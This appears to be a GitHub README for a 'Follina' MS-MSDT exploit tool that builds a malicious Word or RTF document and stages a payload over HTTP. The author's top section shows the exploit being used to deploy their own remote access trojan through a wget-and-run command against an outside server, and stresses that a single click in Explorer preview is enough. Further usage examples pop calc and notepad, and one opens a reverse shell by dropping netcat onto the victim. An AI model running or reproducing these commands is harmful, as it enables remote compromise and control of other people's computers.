## Using the vulnerability to deploy the remote access trojan I made as shown below
> python3 follina.py -c "wget -o 'client.py' https://.source-code-server./Client.py | pythonw client.py"


### [Remote-Access Trojan](https://lissankoirala.ml/projects/remote-access)
<img src="https://github.com/LissanKoirala/LissanKoirala/blob/main/trojan-globe.gif" alt="drawing" with="100"/>

#### Capabilities
![capabilities](https://user-images.githubusercontent.com/58141138/171510409-4f7cb5bd-34df-43e8-8c18-41dcada4cbd6.png)


Not Open Sourced


## As it's a rtf file, it doesn't even need to be opened
Just clicking the rtf file once will set the thing off and the remote-access with be gained
(The Explorer Preview)

--------------

Create a "Follina" MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.

![Screenshot](https://user-images.githubusercontent.com/6288722/171033876-dbe73e3e-0a3a-436a-91d8-7fa77a5c1ace.png)

# Usage

```
usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]

options:
  -h, --help            show this help message and exit
  --command COMMAND, -c COMMAND
                        command to run on the target (default: calc)
  --output OUTPUT, -o OUTPUT
                        output maldoc file (default: ./follina.doc)
  --interface INTERFACE, -i INTERFACE
                        network interface or IP address to host the HTTP server (default: eth0)
  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
```

# Examples

Pop `calc.exe`:

```
$ python3 follina.py   
[+] copied staging doc /tmp/9mcvbrwo
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

Pop `notepad.exe`:

```
$ python3 follina.py -c "notepad"
```

Get a reverse shell on port 9001. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**

```
$ python3 follina.py -r 9001
```

![Reverse Shell](https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png)
